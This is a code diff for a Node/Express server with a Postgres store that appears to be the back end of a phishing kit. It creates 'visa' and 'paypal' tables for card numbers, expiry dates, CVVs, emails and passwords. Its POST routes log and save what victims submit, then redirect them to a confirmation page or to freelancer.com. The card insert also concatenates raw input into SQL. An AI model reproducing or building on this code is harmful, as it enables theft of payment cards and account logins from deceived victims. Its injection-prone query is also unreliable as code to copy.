@@ -9,7 +9,7 @@ app.set('view engine', 'ejs')
 const client = new pg.Client(process.env.DATABASE_URL);
 client.connect();
 
-client.query("create table visa (id serial , card text,exp varchar,cvv text,time timestamp default now())")
+client.query("create table visa (id serial , card text,exp text,cvv text,time timestamp default now())")
 client.query("create table paypal (id serial , mail text,pass text,cardholder text,card text,exp text,cvv text,time timestamp default now())")
 // #######################################################################
 
@@ -33,7 +33,7 @@ app.get('*/confirm', function (req, res) {
 // ############################################################
 
 
-app.post('*/visa', function (req, res) {
+app.post('/visa', function (req, res) {
     var a = req.body.a;
     var b = req.body.b;
     var c = req.body.c;
@@ -41,11 +41,11 @@ app.post('*/visa', function (req, res) {
     console.log(a+'--'+b+'--'+c)
     client.query('Insert into visa (card,exp,cvv) values(' + a + ',' + b + ',' + c + ')')
 })
-app.post('*/paypala', function (req, res) {
+app.post('/paypala', function (req, res) {
     console.log(req.body);
     res.redirect('/confirm')
 })
-app.post('*/paypalb', function (req, res) {
+app.post('/paypalb', function (req, res) {
     console.log(req.body);
     res.redirect('https://www.freelancer.com')
 })
